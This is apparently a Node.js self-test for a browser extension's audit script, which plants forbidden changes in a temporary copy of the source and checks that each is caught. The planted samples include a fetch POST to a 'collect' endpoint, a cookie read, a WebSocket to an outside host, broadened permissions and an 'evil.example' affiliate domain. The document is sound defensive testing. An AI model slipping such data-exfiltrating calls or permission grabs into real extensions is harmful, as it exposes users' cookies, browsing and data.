// Proves the audit is not toothless: plants forbidden things in a copy of the source and expects
// scripts/audit.mjs to fail for each of them.
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..");
const cases = [
  ["background.js", (s) => s + '\nfetch("https://example.com/collect", { method: "POST" });\n', "network call"],
  ["site.js", (s) => s + "\nconst c = document.cookie;\n", "cookie read"],
  ["store.js", (s) => s + '\nconst ws = new WebSocket("wss://example.com");\n', "websocket"],
  ["manifest.json", (s) => s.replace('"tabs"', '"tabs", "history"'), "extra permission"],
  ["manifest.json", (s) => s.replace('"https://rigforge.example.com/*"', '"https://rigforge.example.com/*", "<all_urls>"'), "runs on all sites"],
  ["background.js", (s) => s.replace('"awin1.com"', '"awin1.com", "evil.example"'), "new affiliate domain"],
];

let failed = 0;
for (const [file, mutate, name] of cases) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "audit-"));
  fs.cpSync(path.join(ROOT, "src"), dir, { recursive: true });
  const f = path.join(dir, file);
  fs.writeFileSync(f, mutate(fs.readFileSync(f, "utf8")));
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts", "audit.mjs")], { env: { ...process.env, AUDIT_SRC: dir }, encoding: "utf8" });
  const caught = r.status !== 0;
  console.log(`${caught ? "caught " : "MISSED "} ${name}`);
  if (!caught) failed++;
  fs.rmSync(dir, { recursive: true, force: true });
}
if (failed) { console.error(`${failed} planted problem(s) were not caught`); process.exit(1); }
console.log("Audit self-test passed: every planted problem was caught.");
